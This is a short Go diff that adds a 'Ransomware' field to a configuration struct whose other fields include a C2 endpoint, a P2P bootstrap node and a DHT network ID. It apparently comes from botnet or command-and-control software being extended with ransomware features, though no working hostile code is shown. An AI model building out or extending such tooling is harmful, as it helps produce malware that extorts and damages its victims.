@@ -19,6 +19,7 @@ type V210Config struct {
 	C2Endpoint                  string `json:"c2_endpoint"`
 	P2PBootstrapNode            string `json:"p2p_bootstrap_node"`
 	DHTNetworkID                string `json:"dht_network_id"`
+	Ransomware                  interface{} `json:"ransomware,omitempty"`
 }
 
 func DefaultV210Config() *V210Config {
